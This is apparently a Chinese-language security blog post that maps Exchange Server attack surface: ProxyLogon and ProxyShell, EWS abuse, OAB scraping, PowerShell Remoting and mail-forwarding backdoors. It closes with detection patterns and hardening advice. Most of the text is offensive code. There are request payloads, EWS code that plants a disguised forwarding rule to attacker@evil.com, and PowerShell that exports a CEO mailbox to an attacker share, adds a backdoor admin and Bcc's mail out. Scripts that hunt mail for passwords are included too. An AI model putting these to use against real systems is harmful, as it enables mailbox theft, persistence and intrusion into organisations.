---
title: Exchange邮件服务器攻击面
date: 2025-11-05 08:00:00
tags:
  - 内网渗透
  - 渗透测试
categories: 渗透测试
---

## 前言

Exchange Server 与 AD 域控深度集成且默认暴露大量 Web 端点于公网，是 APT 组织与红队的高价值目标。本文系统梳理 Exchange 的攻击面：ProxyShell/ProxyLogon 漏洞链、EWS API 利用、OAB 虚拟目录、PowerShell Remoting、邮件转发规则后门、邮箱搜索与 SSRF 攻击链，附代码示例与流程图。

**免责声明：** 本文技术仅供安全研究与授权测试使用，严禁用于非法入侵。

---

## 一、Exchange 攻击面总览

Exchange 前端 CAS 托管于 IIS，对外暴露以下虚拟目录构成主要 Web 攻击面：

```
┌──────────────┬──────────────────────────────────┐
│ /owa         │ OWA   — Outlook Web App         │
│ /ecp         │ EAC   — Exchange 管理中心        │
│ /ews         │ EWS   — Exchange Web Services   │
│ /autodiscover│       自动发现服务               │
│ /oab         │ OAB   — 脱机通讯簿 (含GAL)      │
│ /powershell  │       PowerShell Remoting HTTP  │
│ /mapi /rpc   │       MAPI/RPC over HTTP        │
│ /activesync  │       ActiveSync 移动设备同步    │
└──────────────┴──────────────────────────────────┘
```

攻击面归纳：

| 攻击面 | 入口 | 典型利用方式 |
|--------|------|-------------|
| Web层漏洞 | OWA/EAC/EWS | SSRF、反序列化、鉴权绕过 |
| API滥用 | EWS/EWS Managed API | 合法接口恶意调用 |
| 管理通道 | PowerShell Remoting | 远程命令执行与持久化 |
| 邮件逻辑 | 收件箱规则/传输规则 | 隐蔽邮件转发后门 |
| 信息泄露 | OAB/自动发现 | 全局地址列表、组织架构窃取 |

---

## 二、ProxyLogon 漏洞链 (CVE-2021-26855)

ProxyLogon (CVE-2021-26855) 是 Exchange SSRF 漏洞，攻击者通过 `X-AnonResource-Backend` Cookie 绕过前端鉴权直接访问后端 (端口444)。

```
攻击者 ── HTTP (X-AnonResource-Backend) ──> 前端:443 ──鉴权绕过──> 后端:444
```

第一步，访问 `/ecp/proxy.js` 获取管理员 LegacyDN：

```
GET /ecp/proxy.js HTTP/1.1
Host: mail.target.com
Cookie: X-AnonResource-Backend=exchange-backend.local/ecp/proxy.js#~1941962753
X-BEResource: admin@target.com:444/ecp/proxy.js#~1941962753
```

第二步，利用返回的 LegacyDN 构造 SetObject 请求写入 webshell。第三步通过 GetObject 触发反序列化获取代码执行。

---

## 三、ProxyShell 漏洞链

ProxyShell 由三个 CVE 组合：**CVE-2021-34473** (路径混淆鉴权绕过)、**CVE-2021-34523** (PowerShell 端点提权)、**CVE-2021-31207** (任意文件写入后反序列化 RCE)。

### 3.1 CVE-2021-34473 路径混淆

构造包含特殊字符的邮箱地址格式，使前端误判请求目标：

```
GET /autodiscover/autodiscover.json?@evil.com/ews/exchange.asmx?
    &Email=autodiscover/autodiscover.json%3F@evil.com HTTP/1.1
Host: mail.target.com
```

攻击者利用路径中的 `?` 和 `@` 字符造成解析歧义，将未授权请求代理至后端 EWS 端点。

### 3.2 CVE-2021-34523 PowerShell 提权

`/powershell` 虚拟目录将 HTTP 请求转换为后端 PowerShell Remoting 会话。通过 SSRF 绕过后端鉴权后可直接注入命令：

```powershell
$body = @{
    "X-CommonAccessToken"   = "构造的Token"
    "X-PowerShell-Command"  = "New-MailboxExportRequest -Mailbox user@target.com `
                               -FilePath \\\\attacker\\share\\export.pst"
}
```

### 3.3 ProxyShell 完整攻击链

```
攻击者 ──①路径混淆SSRF──> 前端:443 ──③PS Remoting(SSRF隧道)──> 后端:444
  ^        <──②后端响应──              <──④命令执行⑤写shell──
```

---

## 四、EWS API 利用

EWS 是一套 SOAP API，攻击者获得凭证后可通过其实现邮件窃取、规则注入与日历监控。

### 4.1 枚举收件箱与创建隐形转发规则

```csharp
ExchangeService service = new ExchangeService(ExchangeVersion.Exchange2013_SP1);
service.Credentials = new WebCredentials("user", "pass", "domain");
service.Url = new Uri("https://mail.target.com/ews/exchange.asmx");

// 枚举收件箱
ItemView view = new ItemView(50);
FindItemsResults<Item> results = service.FindItems(WellKnownFolderName.Inbox, view);
foreach (EmailMessage msg in results) { msg.Load(); Console.WriteLine(msg.Subject); }

// 创建隐形转发规则 (伪装为系统通知)
Rule newRule = new Rule {
    DisplayName = "Microsoft_Update_Notification", Priority = 1,
    Conditions = new RulePredicates(), Actions = new RuleActions(), IsEnabled = true
};
newRule.Actions.ForwardToRecipients.Add(new EmailAddress("attacker@evil.com"));
newRule.Actions.Delete = false;
service.UpdateInboxRules(
    new UpdateInboxRulesRequest { Operations = { new CreateRuleOperation(newRule) } },
    WellKnownFolderName.Inbox);
```

### 4.2 EWS Impersonation（用户模拟）

```csharp
service.ImpersonatedUserId = new ImpersonatedUserId(
    ConnectingIdType.SmtpAddress, "ceo@target.com");
// 此后所有 EWS 操作均以 CEO 身份执行
```

---

## 五、OAB 虚拟目录攻击

Offline Address Book (OAB) 存储全球地址列表 (GAL)，含所有用户邮箱、名称、部门信息。OAB 目录通常允许匿名或域认证访问，是内网信息收集的富矿。访问 `https://mail.target.com/oab/<GUID>/oab.xml` 可解析出完整组织架构（高管邮箱、部门层级等）。

```python
import requests, xml.etree.ElementTree as ET

def extract_oab(base_url):
    """从 OAB 提取全局地址列表"""
    resp = requests.get(f"{base_url}/oab/", verify=False)
    # 定位 GUID → 下载 oab.xml → 解析 Mailbox 节点
    users = []
    for item in root.findall('.//Mailbox'):
        users.append({
            'email': item.find('SmtpAddress').text,
            'name':  item.find('DisplayName').text,
            'dept':  item.find('Department').text
        })
    return users
```

---

## 六、Exchange PowerShell Remoting

Exchange 管理 Shell 基于 WinRM，在获得域凭证后可直连执行管理命令。

```powershell
# 建立远程 Shell 会话
$cred = New-Object System.Management.Automation.PSCredential(
    "target\admin", (ConvertTo-SecureString "P@ssw0rd" -AsPlainText -Force))
$session = New-PSSession -ConfigurationName Microsoft.Exchange `
    -ConnectionUri "https://exchange.target.com/powershell/" -Credential $cred `
    -Authentication Basic
Import-PSSession $session

# 常用后渗透 cmdlet
New-MailboxExportRequest -Mailbox ceo@target.com `
    -FilePath "\\attacker-c2\share\ceo_mailbox.pst"

New-Mailbox -Name 'svc_backup' -UserPrincipalName 'svc_backup@target.com' `
    -Password (ConvertTo-SecureString 'P@ssw0rd123!' -AsPlainText -Force)
Add-RoleGroupMember "Organization Management" -Member "svc_backup"

New-TransportRule -Name "Compliance_Archive" -SentTo "ceo@target.com" `
    -BlindCopyTo "attacker@evil.com"
```

---

## 七、邮件转发规则后门

传输规则 (Transport Rule) 运行于 Exchange 传输管道，作用在组织级别，用户无法在 OWA 看到，隐蔽性极高。

```
外部发件 → 接收连接器 → Transport Rule Pipeline → 目标收件人
                                │ Bcc/重定向 → 攻击者邮箱
```

```powershell
# 创建隐蔽传输规则
New-TransportRule -Name "ComplianceRetention" -Priority 0 `
    -SentTo "ceo@target.com" -BlindCopyTo "external@evil.com"
New-TransportRule -Name "MailFlow_Diagnostics" -Priority 0 `
    -SubjectContainsWords "密码","合同","报表" -RedirectMessageTo "logger@evil.com"

# 检测与清除
Get-TransportRule | fl Name, Actions, Conditions
Remove-TransportRule -Identity "ComplianceRetention" -Confirm:$false
```

---

## 八、邮箱搜索与数据窃取

Exchange 提供 Content Search / eDiscovery 功能，允许管理员跨所有邮箱全文搜索。

```powershell
# 合规性搜索 — 跨全组织邮箱搜索敏感关键词
New-ComplianceSearch -Name "Audit_Q3" -ExchangeLocation "All" `
    -ContentMatchQuery '("密码" OR "password" OR "VPN") AND (sent>=2025-01-01)'
Start-ComplianceSearch -Identity "Audit_Q3"
Get-ComplianceSearch -Identity "Audit_Q3" | Select Items, Size, Status
```

```python
# EWS 细粒度搜索 (Python exchangelib)
from exchangelib import Account, Credentials, DELEGATE, Configuration, Q
creds = Credentials('DOMAIN\\user', 'password')
config = Configuration(server='mail.target.com', credentials=creds, auth_type='NTLM')
account = Account('user@target.com', config=config, autodiscover=False, access_type=DELEGATE)
results = account.inbox.filter(
    Q(subject__contains='密码') | Q(body__contains='password')
).only('subject', 'sender', 'datetime_received')
for item in results:
    print(f"[+] {item.datetime_received} | {item.sender} | {item.subject}")
```

---

## 九、Exchange SSRF 完整攻击链

将上述攻击面串联，形成从外网到域控的 kill chain：

```
① 信息收集     端口扫描 (443,444) + 虚拟目录枚举 + 版本探测
      │
② 初始访问     ProxyLogon: SSRF→鉴权绕过→写shell
               ProxyShell: 路径混淆→PowerShell RCE
               弱口令爆破: OWA / EAC / EWS
      │
③ 权限提升     EWS Impersonation → 模拟域名管理员
               PS Remoting → 添加 Organization Management
               Exchange Trusted Subsystem → DCSync 权限
      │
④ 持久化       传输规则后门 / 收件箱规则后门 (EWS注入)
               计划任务定时导出邮箱 / EWS Push Notification
      │
⑤ 横向移动     DCSync (Replicating Directory Changes)
               Kerberoast → Exchange 服务账户 Hash
               邮箱搜索 → VPN凭据、数据库连接串、内部拓扑
      │
⑥ 数据窃取     邮箱导出(.pst) + EWS SyncFolderItems
               合规性搜索导出 (Compliance Search Export)
```

---

## 十、检测与防御

**IIS 日志检测特征：**

```
# ProxyLogon — 异常 Cookie 头
Cookie: X-AnonResource-Backend=.*#~
# ProxyShell — 异常 autodiscover 请求
GET /autodiscover/autodiscover.json.*@.*/ews/exchange.asmx
```

**Windows 事件日志监控：**

| Event ID | 来源 | 检测内容 |
|----------|------|---------|
| 1 (Sysmon) | 进程创建 | `New-TransportRule`, `New-MailboxExportRequest` |
| 4662 | AD | 非预期的目录复制操作 (DCSync) |
| 4104 | PS | 包含 Exchange cmdlet 的可疑脚本块 |

**加固措施：** 及时更新 CU/SU 补丁；限制后端 444 端口仅本机访问；禁用基本认证；部署 EOMT；定期审计传输规则与收件箱规则。

---

## 结语

Exchange Server 攻击面的广度源于其在企业架构中的枢纽地位——它既是互联网入口，又与内网域控深度耦合。理解这些攻击面的本质比记忆单个 CVE 更重要：Exchange 是一座连接外网与内网、用户与域控的桥梁，攻守双方在桥上的博弈从未停歇。

**再次声明：** 本文所有内容仅用于安全研究与防护体系建设，任何未经授权的入侵行为均属违法。

---

*Published: 2025-11-05 | Security Research Team*
